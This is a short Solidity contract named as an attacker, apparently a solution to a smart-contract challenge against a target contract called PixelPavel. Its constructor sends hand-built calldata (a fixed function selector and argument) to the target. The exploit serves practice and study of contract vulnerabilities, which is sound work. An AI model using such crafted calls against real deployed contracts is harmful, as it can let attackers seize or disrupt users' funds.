pragma solidity 0.7.6;

import "./PixelPavel.sol";

contract ebaizelAttacker {
    
    constructor(PixelPavel instance) public payable {
        bytes memory data = abi.encodePacked(bytes4(0xa4e0b0eb), bytes32(0x000000000000000000000000000000000000000000000000000000000000012a));
        (bool success, ) = address(instance).call(data);
        require(success);
    }

    receive() external payable { 
    }

}